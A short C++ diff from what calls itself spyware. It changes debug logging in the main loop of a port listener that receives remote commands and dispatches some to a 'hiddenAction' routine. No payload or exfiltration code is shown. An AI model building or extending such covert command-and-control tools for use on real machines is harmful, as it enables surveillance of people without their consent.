@@ -20,7 +20,7 @@ void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& ad
 
 int main() {
     
-    std::cout << "started spyware" << std::endl;
+    std::cerr << "started spyware" << std::endl;
     
     HiderManeger& hiderManager = HiderManeger::getInstance();
     Listener listener = Listener(PORT);
@@ -37,7 +37,7 @@ int main() {
             continue;
         }
         loopIter(conn, hiderManager, admin);
-        std::cout << "compleated loop iter\n";
+        std::cerr << "spyware: compleated loop iter\n";
     }
 
     return EXIT_SUCCESS;
@@ -77,7 +77,7 @@ void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& ad
         stat = hiderManeger.hiddenAction(cmd, conn);
     }
 
-    std::cout << "Conn: res-" << stat << " response-\n" << strRes << std::endl;
+    std::cerr << "Spyware:  Conn: res-" << stat << " response-\n" << strRes << std::endl;
     conn.sendResponce(stat, strRes);
     
 }
